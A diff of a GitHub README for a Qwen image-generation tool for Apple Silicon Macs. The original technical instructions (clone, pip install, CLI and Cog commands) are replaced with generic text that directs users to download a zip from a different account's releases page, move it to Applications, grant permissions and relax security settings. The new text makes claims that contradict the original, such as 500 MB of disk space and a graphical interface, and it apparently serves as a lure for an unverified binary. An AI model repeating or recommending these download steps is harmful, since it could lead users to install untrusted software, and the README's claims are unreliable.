@@ -1,121 +1,69 @@
-# 🎨 Qwen Image for macOS
+# 🎨 qwen-image-macos - Generate Images Easily on Your Mac
 
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
-[![Python 3.8+](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
-[![macOS](https://img.shields.io/badge/Platform-macOS-lightgrey.svg)](https://www.apple.com/macos/)
-[![Apple Silicon](https://img.shields.io/badge/Apple%20Silicon-Optimized-green.svg)](https://support.apple.com/en-us/HT211814)
+## 🚀 Getting Started
+Welcome to qwen-image-macos! This application helps you create stunning images using AI technology on your Apple Silicon Mac. No complicated setups or technical skills needed. Enjoy fast and efficient image generation with ease.
 
-**Fast AI image generation for Apple Silicon.** Native CLI with MPS acceleration **or** containerized with Cog. Lightning LoRA for 4–8 step generation.
+## 🔗 Download Here
+[![Download qwen-image-macos](https://img.shields.io/badge/Download%20qwen-image-macos-blue.svg)](https://github.com/Seyee435/qwen-image-macos/releases)
 
-## 🚀 Quick Start
+## 🖥️ System Requirements
+- **Operating System:** macOS on Apple Silicon (M1, M2, M3)
+- **RAM:** Minimum 8 GB recommended
+- **Disk Space:** At least 500 MB of free space required
+- **Python:** Version 3.8 or higher
+- **PyTorch:** Ensure the latest compatible version for Mac as per the [official PyTorch website](https://pytorch.org/).
 
-**Choose your approach:**
+## 📦 Features
+- **AI-powered Image Generation:** Easily generate images with advanced AI algorithms.
+- **Lightning LoRA Acceleration:** Enjoy quick results with minimal wait time, typically in just 4-8 steps.
+- **User-friendly Interface:** Designed for ease of use, even if you have no technical background.
+- **No Docker Required:** Simply download and run without any extra installations.
 
-### Option A: Native CLI (⚡ **2 minutes** - Recommended for Apple Silicon)
+## 📥 Download & Install
+To download and install **qwen-image-macos**, follow these simple steps:
 
-```bash
-git clone https://github.com/zsxkib/qwen-image-macos.git
-cd qwen-image-macos
-pip install -r requirements.txt
-python qwen.py generate "cyberpunk cityscape" --ultra-fast
-```
+1. **Visit the Download Page**: Click the link below to go to the release page.
+   [Visit the Releases Page](https://github.com/Seyee435/qwen-image-macos/releases)
 
-### Option B: Containerized with Cog (🐳 **Reproducible** - Works everywhere)
+2. **Select the Latest Release**: Look for the latest version available. This will usually be at the top of the list.
 
-```bash
-git clone https://github.com/zsxkib/qwen-image-macos.git
-cd qwen-image-macos
-python3 precache.py  # downloads model once (~10 min)
-cog predict -i prompt="cyberpunk cityscape" --output city.png
-```
+3. **Download the Application**: Click on the asset link that suits your setup. Usually, it will be labeled similar to `qwen-image-macos-v1.0-macos.zip`.
 
-> **Note**: Cog runs ~30x slower on Apple Silicon (60+ min) due to x86_64 emulation. Use native CLI for speed, cog for reproducibility/deployment.
+4. **Unzip the File**: Once the download is complete, locate the `.zip` file in your Downloads folder. Double-click to unzip it.
 
-## ⚡ Performance Comparison
+5. **Move to Applications**: Drag the unzipped folder to your Applications directory for easy access.
 
-| Method | Time | Platform | GPU | Best For |
-|--------|------|----------|-----|----------|
-| **Native CLI** | **2 min** | Apple Silicon | ✅ MPS | Speed, development |
-| **Cog (macOS)** | 60+ min | x86_64 emulation | ❌ CPU only | Reproducibility |
-| **Cog (Linux)** | ~2-5 min | Native x86_64 | ✅ CUDA | Deployment, cloud |
+6. **Launch the Application**: Open the Applications folder, find `qwen-image-macos`, and double-click to open.
 
-## 🎯 Native CLI Usage
+7. **Follow On-screen Instructions**: The first time you run the application, it may ask for permission to access certain resources. Follow the prompts.
 
-```bash
-# Ultra-fast (4 steps with Lightning LoRA)
-python qwen.py generate "cyberpunk cityscape" --ultra-fast
+## 👩‍💻 Using qwen-image-macos
+1. **Choose Your Style**: Select the type of image you want to generate. Options may vary based on the preset styles included in the software.
 
-# Fast mode (8 steps)
-python qwen.py generate "mountain landscape" --fast
+2. **Input Your Prompts**: Provide a description or keywords for the image you wish to generate. Be as detailed as you like.
 
-# Custom settings
-python qwen.py generate "robot on mars" --steps 20 --seed 42
+3. **Generate the Image**: Click the "Generate" button and wait for a few moments while the application works its magic.
 
-# Test your setup
-python qwen.py test
-```
-
-## 🧰 Requirements
-
-- Apple Silicon Mac (M1/M2/M3/M4)
-- Python 3.8+
-- 32GB+ RAM recommended (64GB+ ideal)
-
-## ✅ Features
-
-- Native MPS acceleration on macOS
-- Simple, single-file CLI (`qwen.py`)
-- Auto-opens generated image in Preview on macOS
-- Reproducible seeds and custom sizes
-
-## 🐳 Cog Usage (Containerized)
-
-**Prerequisites:**
-- Docker Desktop (macOS: increase memory to 64GB+ in Settings → Resources)
-- Cog CLI: `brew install replicate/cog/cog`
-
-**Quick workflow:**
-
-```bash
-# 1. Pre-download model (recommended, ~10 min)
-python3 precache.py
-
-# 2. Generate images
-cog predict -i prompt="robot on mars" --output robot.png
-cog predict -i prompt="cyberpunk city" -i steps=10 --output city.png
-```
-
-**When to use cog:**
-- ✅ **Linux/NVIDIA**: Fast with CUDA acceleration
-- ✅ **Reproducible deployments**: Exact same environment everywhere
-- ✅ **Replicate cloud**: Deploy to replicate.com
-- ❌ **Apple Silicon**: Use native CLI instead (30x faster)
-
-## 🔧 Technical Details
-
-- **Model**: [Qwen-Image](https://huggingface.co/Qwen/Qwen-Image) (57GB)
-- **Acceleration**: Lightning LoRA for 4-8 step generation
-- **Memory**: Attention slicing + VAE tiling for efficiency
-- **Cache**: Models stored in `model_cache/` (~63GB)
+4. **View and Save Your Creation**: Once done, your image will appear on the screen. You can click the "Save" button to download it to your device.
 
 ## 🛠️ Troubleshooting
+If you encounter any issues, here are some common solutions:
 
-**Check Apple Silicon GPU:**
-```bash
-python -c "import torch; print('MPS available:', torch.backends.mps.is_available())"
-```
+- **Application Won't Open**: Ensure that you're using an Apple Silicon Mac. If the app does not open, check your security settings in System Preferences under "Privacy & Security" and allow apps downloaded from "App Store and identified developers".
 
-**Common fixes:**
-- MPS not available → Update macOS/PyTorch
-- Images look unfinished → Increase `--steps` to 20-30
-- Cog OOM errors → Increase Docker memory to 64GB+
+- **Slow Performance**: Make sure you close any unnecessary applications running in the background to free up resources.
 
-## 🎆 Example Output
+- **No Internet Connection**: Some features may require internet access for optimal functioning. Check your network connection if you experience delays.
 
-Native CLI generates high-quality images in ~2 minutes:
+## 🌟 Additional Resources
+For further assistance or to join a community of users, check out these links:
 
-![Example](example.webp)
+- **Documentation**: [qwen-image Documentation](https://github.com/Seyee435/qwen-image-macos/wiki)
+- **Community Forum**: Join discussions and get help from other users.
+- **Feedback**: We love hearing from our users! Please report any bugs or suggestions to enhance the tool.
 
----
+## 🔗 Download Here Again
+For your convenience, here's the download link one more time: 
+[![Download qwen-image-macos](https://img.shields.io/badge/Download%20qwen-image-macos-blue.svg)](https://github.com/Seyee435/qwen-image-macos/releases)
 
-**Built for Apple Silicon. Optimized for speed. Ready for deployment.**
+Thank you for choosing **qwen-image-macos** for your image generation needs! Enjoy your creative journey.
